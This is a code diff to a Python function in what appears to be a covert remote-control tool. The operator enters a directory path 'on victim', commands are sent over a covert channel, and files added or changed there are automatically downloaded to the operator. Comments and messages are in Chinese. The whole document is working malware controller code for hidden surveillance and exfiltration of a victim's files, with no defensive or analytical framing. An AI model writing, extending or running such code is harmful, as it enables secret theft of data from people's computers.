@@ -382,18 +382,22 @@ def cmd_monitor_file(comm: Commander):
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录；新增或修改时下载）")
+    print(f"[Commander] 开始监控目录：{dir_path}")
+    # 启动监控
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
-    processed = set()
+    processed = set()  # 只在新增时去重，修改时每次都下载
+
     try:
         while True:
             data = comm.recv_covert_message()
             if not data:
                 continue
-            # 解析 JSON
+
+            # 只处理 JSON 事件
             try:
-                msg = json.loads(data.decode('utf-8', errors='ignore').strip())
+                raw = data.decode('utf-8', errors='ignore').strip()
+                msg = json.loads(raw)
             except:
                 continue
 
@@ -402,27 +406,29 @@ def cmd_monitor_dir(comm: Commander):
             path  = msg.get('path', '')
             ts    = msg.get('timestamp', '')
 
-            if typ not in ("MON_DIR_ADDED", "MON_DIR_MODIFIED"):
+            # 忽略隐藏文件和 swap 文件
+            if not fname or fname.startswith('.') or fname.endswith('.swp'):
                 continue
-            if not fname or fname.startswith('.') or fname.endswith('.swp') or os.path.sep in fname:
+            # 只监控根目录下的文件
+            if os.path.sep in fname:
                 continue
-            if typ == "MON_DIR_ADDED" and fname in processed:
-                continue
-            processed.add(fname)
 
-            action = "新增" if typ == "MON_DIR_ADDED" else "修改"
+            # 根据事件类型决定是否下载
+            if typ == "MON_DIR_ADDED":
+                if fname in processed:
+                    continue
+                processed.add(fname)
+                action = "新增"
+            elif typ == "MON_DIR_MODIFIED":
+                action = "修改"
+            else:
+                continue
+
             remote_file = os.path.join(path, fname)
             print(f"[{ts}] 目录文件{action}：{remote_file}，准备下载…")
 
-            # —— 1) 停止监控 & 吞掉确认 ——
-            comm.send_covert_message(b"CMD_STOP_MON_DIR")
-            stop_resp = comm.recv_covert_message()
-            if stop_resp:
-                print(f"[*] {stop_resp.decode(errors='ignore')}")
-            # **保证监控线程真正退出**
-            time.sleep(1.2)
 
-            # —— 2) 下载文件 ——
+            # —— 执行下载 ——
             try:
                 local_name = os.path.basename(remote_file)
                 if comm.download_file_with_debug(remote_file, local_name):
@@ -432,18 +438,13 @@ def cmd_monitor_dir(comm: Commander):
             except Exception as e:
                 print(f"[!] 下载异常：{e}")
 
-            # —— 3) 恢复监控 & 吞掉确认 ——
+            # —— 恢复监控 ——
             comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
-            ack = comm.recv_covert_message()
-            if ack:
-                print(f"[*] {ack.decode(errors='ignore')}")
-            # **等待新线程启动完成**
-            time.sleep(1.2)
+            time.sleep(0.5)  # 等待新线程启动
 
     except KeyboardInterrupt:
         print("\n[*] 停止目录监控。")
         comm.send_covert_message(b"CMD_STOP_MON_DIR")
-
 
 
 
